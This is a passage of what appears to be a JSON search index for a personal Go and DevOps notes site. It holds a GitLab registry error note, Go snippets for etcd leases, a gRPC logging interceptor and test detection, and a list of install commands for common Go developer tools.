\u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eissue3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"console-output\"\u003econsole output\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Gitlab Container Registry\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ereceived unexpected HTTP status: \u003cspan style=\"color:#ae81ff\"\u003e500\u003c/span\u003e Internal Server Error\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cp\u003e\u003ccode\u003e/etc/gitlab/gitlab.rb\u003c/code\u003e\u003c/p\u003e","tags":null,"title":"Gitlab docs"},{"categories":null,"contents":" ETCD TTL func main() { // 创建 etcd 客户端 cli, err := clientv3.New(clientv3.Config{ Endpoints: []string{\u0026#34;localhost:2379\u0026#34;}, DialTimeout: 5 * time.Second, }) if err != nil { fmt.Println(\u0026#34;Error connecting to etcd:\u0026#34;, err) return } defer cli.Close() // 设置 TTL (单位为秒) ttl := int64(10) // 例如 10 秒 resp, err := cli.Grant(context.TODO(), ttl) if err != nil { fmt.Println(\u0026#34;Error creating lease:\u0026#34;, err) return } // 使用 Lease ID 进行 Put 操作 _, err = cli.Put(context.TODO(), \u0026#34;my-key\u0026#34;, \u0026#34;my-value\u0026#34;, clientv3.WithLease(resp.ID)) if err != nil { fmt.Println(\u0026#34;Error putting key with lease:\u0026#34;, err) return } fmt.Println(\u0026#34;Key with TTL successfully set.\u0026#34;) } gRPC UnaryInterceptor func unaryInterceptor( ctx context.Context, req interface{}, info *googleGrpc.UnaryServerInfo, handler googleGrpc.UnaryHandler, ) (interface{}, error) { // 打印被调用的方法名 fmt.Println(\u0026#34;Called method:\u0026#34;, info.FullMethod) // 打印传入的请求参数 fmt.Printf(\u0026#34;Request: %+v\\n\u0026#34;, req) fmt.Printf(\u0026#34;Meta: %+v\\n\u0026#34;, util.GetReqInfoFromCtx(ctx)) // 调用实际的 handler response, err := handler(ctx, req) if err != nil { fmt.Println(\u0026#34;err: \u0026#34;, err) } return response, err } isRunningTest // isRunningTest 確認是否在跑測試 func isRunningTest() bool { return flag.Lookup(\u0026#34;test.v\u0026#34;) != nil } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/snippet/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eETCD TTL\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 创建 etcd 客户端\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eConfig\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eEndpoints\u003c/span\u003e:   []\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;localhost:2379\u0026#34;\u003c/span\u003e},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eDialTimeout\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error connecting to etcd:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 设置 TTL (单位为秒)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ettl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e int64(\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 例如 10 秒\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGrant\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003ettl\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error creating lease:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 使用 Lease ID 进行 Put 操作\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePut\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e(), \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;my-key\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;my-value\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithLease\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eID\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error putting key with lease:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Key with TTL successfully set.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egRPC UnaryInterceptor\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eunaryInterceptor\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003einfo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egoogleGrpc\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnaryServerInfo\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ehandler\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egoogleGrpc\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnaryHandler\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) (\u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}, \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 打印被调用的方法名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Called method:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003einfo\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFullMethod\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 打印传入的请求参数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Request: %+v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Meta: %+v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eutil\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGetReqInfoFromCtx\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 调用实际的 handler\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehandler\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;err: \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eisRunningTest\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// isRunningTest 確認是否在跑測試\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eisRunningTest\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eflag\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLookup\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test.v\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Go Snippet"},{"categories":null,"contents":" tools benchstat go install golang.org/x/perf/cmd/benchstat@latest deadcode go install golang.org/x/tools/cmd/deadcode@latest httpstat It\u0026rsquo;s like curl -v, with colours. go get github.com/davecheney/httpstat jsonnet This an implementation of Jsonnet in pure Go go get github.com/google/go-jsonnet/cmd/jsonnet migrate go install -tags \u0026#39;mysql,sqlite,sqlite3\u0026#39; github.com/golang-migrate/migrate/v4/cmd/migrate@latest protobuf go install google.golang.org/protobuf/cmd/protoc-gen-go@lastest go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@lastest go install github.com/google/gnostic/cmd/protoc-gen-openapi@latest gosec Golang security checker go get -u github.com/securego/gosec/cmd/gosec govulncheck go install golang.org/x/vuln/cmd/govulncheck@latest vegeta HTTP load testing tool and library go get -u github.com/tsenart/vegeta dasel Select, put and delete data from JSON, TOML, YAML, XML and CSV files with a single tool. Supports conversion between formats and can be used as a Go package. brew install dasel go install github.com/tomwright/dasel/v2/cmd/dasel@master hey HTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom brew install hey slides Terminal based presentation tool brew install slides go install github.com/maaslalani/slides@latest gokart A static analysis tool for securing Go code go install github.com/praetorian-inc/gokart@latest structslop structslop is a static analyzer for Go that recommends struct field rearrangements to provide for maximum space/allocation efficiency. go install -v github.com/orijtech/structslop/cmd/structslop@v0.0.8 go get github.com/orijtech/structslop/cmd/structslop dive A tool for exploring each layer in a docker image brew install dive go get github.com/wagoodman/dive sttr cross-platform, cli app to perform various operations on string go install github.com/abhimanyu003/sttr@latest gentool Gen Tool is a single binary without dependencies can be used to generate structs from database go install gorm.io/gen/tools/gentool@latest wire go install github.com/google/wire/cmd/wire@latest ko Build and deploy Go applications go install github.com/google/ko@latest Talisman A tool to detect and prevent secrets from getting checked in\nhttps://github.com/thoughtworks/talisman\nbrew install talisman\n","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/tools/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etools\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"benchstat\"\u003ebenchstat\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/perf/cmd/benchstat@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"deadcode\"\u003edeadcode\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/tools/cmd/deadcode@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"httpstat\"\u003ehttpstat\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eIt\u0026rsquo;s like curl -v, with colours.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/davecheney/httpstat\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"jsonnet\"\u003ejsonnet\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eThis an implementation of Jsonnet in pure Go\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/google/go-jsonnet/cmd/jsonnet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"migrate\"\u003emigrate\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install -tags \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;mysql,sqlite,sqlite3\u0026#39;\u003c/span\u003e github.com/golang-migrate/migrate/v4/cmd/migrate@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"protobuf\"\u003eprotobuf\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install google.golang.org/protobuf/cmd/protoc-gen-go@lastest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install google.golang.org/grpc/cmd/protoc-gen-go-grpc@lastest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/gnostic/cmd/protoc-gen-openapi@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gosec\"\u003egosec\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eGolang security checker\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get -u github.com/securego/gosec/cmd/gosec\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"govulncheck\"\u003egovulncheck\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/vuln/cmd/govulncheck@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"vegeta\"\u003evegeta\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eHTTP load testing tool and library\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get -u github.com/tsenart/vegeta\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 